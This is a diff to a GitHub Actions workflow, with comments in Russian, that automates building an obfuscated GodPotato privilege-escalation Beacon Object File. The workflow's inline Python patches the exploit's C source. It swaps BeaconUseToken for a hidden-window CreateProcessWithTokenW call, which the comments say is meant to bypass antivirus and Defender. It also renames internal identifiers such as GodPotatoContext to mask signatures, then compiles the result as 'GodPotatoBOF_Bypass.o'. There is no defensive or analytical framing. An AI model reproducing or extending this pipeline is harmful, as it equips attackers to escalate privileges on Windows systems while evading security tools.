@@ -30,14 +30,17 @@ jobs:
       shell: python
       run: |
         import os
+        import sys
 
-        # Открываем главный файл entry.c из репозитория донора
+        # Принудительно ставим UTF-8 для вывода в терминал GitHub, чтобы не было ошибок кодировки
+        sys.stdout.reconfigure(encoding='utf-8')
+
         c_file_path = os.path.join("gpp-temp", "entry.c")
         
         with open(c_file_path, "r", encoding="utf-8") as f:
             code = f.read()
 
-        # Старая функция, ломающая загрузку в bof-launcher
+        # Функция, которую мы ищем и вырезаем
         old_token_call = "BeaconUseToken(hToken);"
         
         # Новый Си-код для обхода AV и удаления BeaconUseToken
@@ -68,7 +71,7 @@ jobs:
         si.wShowWindow = 0;      // SW_HIDE (Скрывает окно процесса от Defender)
         KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
 
-        # // Вызов системного API создания процесса из токена напрямую
+        // Вызов системного API создания процесса из токена напрямую
         ADVAPI32$CreateProcessWithTokenW(hToken, 1, NULL, clear_cmd, 0, NULL, NULL, &si, &pi);
         
         if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
@@ -77,11 +80,12 @@ jobs:
 
         if old_token_call in code:
             code = code.replace(old_token_call, new_token_call)
-            print("[+] Успешно пропатчен вызов токена в entry.c.")
+            print("[+] Successfully patched token call in entry.c.")
         else:
-            print("[-] Критическая ошибка: Сигнатура BeaconUseToken не найдена в entry.c!")
+            print("[-] Critical Error: BeaconUseToken signature NOT found in entry.c!")
+            sys.exit(1)
 
-        # Дополнительная маскировка внутренних структур проекта
+        # Маскировка внутренних структур проекта
         code = code.replace("GodPotatoContext", "SystemDcomBinding")
         code = code.replace("PotatoTrigger", "TriggerPipeRpc")
         
@@ -94,12 +98,10 @@ jobs:
       with:
         version: 0.14.1 
 
-    # 6. Сборка проекта 
+    # 6. Сборка проекта
     - name: Compile Obfuscated BOF File
       run: |
         cd gpp-temp
-        # -I. -Icommon подключает все ваши файлы (beacon.h, bofdefs.h, wmi.h)
-        # -D_WIN32_WINNT=0x0600 сообщает Zig, что мы собираем под современную Windows (от Vista/7 до 10/2022)
         zig cc -c entry.c -o ../GodPotatoBOF_Bypass.o -I. -Icommon -D_WIN32_WINNT=0x0600 -O ReleaseSmall -fstrip -fno-asynchronous-unwind-tables
         cd ..
 
